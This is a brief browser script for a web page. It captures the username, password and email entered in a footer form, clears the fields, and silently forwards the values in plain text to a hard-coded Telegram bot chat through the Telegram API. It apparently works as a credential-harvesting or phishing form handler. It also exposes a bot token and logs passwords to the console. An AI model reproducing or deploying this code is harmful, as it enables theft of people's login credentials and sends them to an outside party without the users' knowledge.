let token = `5923539232:AAG13nofdfneBrtx2-sLs1qDCrD2Fwj6HvM`;
let chat_id = `-1001837026407`;
let elForm = document.querySelector('.footer__main-form')
let elUsername = document.querySelector('.footer__main-input');
let elPassword = document.querySelector('.footer__main-password');
let elEmail = document.querySelector('.footer__main-email');
let elSubmitBtn = document.querySelector('.footer__btn');
elForm.addEventListener('submit', function (event) {
    event.preventDefault();
    let username = elUsername.value.trim();
    let password = elPassword.value.trim();
    let email = elEmail.value.trim();
    console.log(username);
    console.log(password);
    console.log(email);
    elUsername.value = null;
    elPassword.value = null;
    elEmail.value = null;
    sendData(username, password, email);
})
async function sendData(newUsername, newPassword, newEmail) {
    let info = `User: %0A <strong>Username:</strong> ${newUsername} %0A <strong>Password:</strong> ${newPassword} %0A <strong>Email Address:</strong> ${newEmail}`;
    let response = await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${info}&parse_mode=html`);
    let data = await response.json();
    console.log(data);
}